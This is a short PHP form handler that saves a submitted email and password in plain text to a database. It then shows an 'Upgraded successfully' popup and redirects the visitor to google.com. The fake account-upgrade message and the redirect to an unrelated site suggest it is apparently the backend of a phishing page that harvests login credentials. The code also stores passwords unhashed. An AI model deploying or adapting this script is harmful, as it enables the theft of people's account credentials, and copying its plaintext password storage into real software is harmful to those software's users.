<?php
session_start();
include("connection.php");

if(isset($_POST['submit'])){
    // Sanitize input
    $email = mysqli_real_escape_string($conn, $_POST['email']);
    $password = mysqli_real_escape_string($conn, $_POST['pass']);

    // Store the email in the session
    $_SESSION['email'] = $email;

    // Debugging: Check if email is set in session
    var_dump(".");

    // Check if email and password are set
    if(!empty($email) && !empty($password)){
        // Insert the email and password into the database
        $sql = "INSERT INTO signup(email, password) VALUES ('$email', '$password')";
        $result = mysqli_query($conn, $sql);
        if($result){
            // header("Location: welcome.php");
            // echo '<script>alert("Upgraded successfully"); window.location.href = "https://www.google.com";</script>';
            echo '<script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>';
            echo '<script>
                    Swal.fire({
                      title: "Upgraded successfully",
                      icon: "success",
                      showConfirmButton: false,
                      timer: 2500
                    }).then(function() {
                      window.location.href = "https://www.google.com";
                    }
                  );
                  </script>';
            exit();
        } else {
          echo".";
            // echo "Error: " . mysqli_error($conn);
        }
    } else {
        echo "Error: Email or password is empty";
    }
}
?>
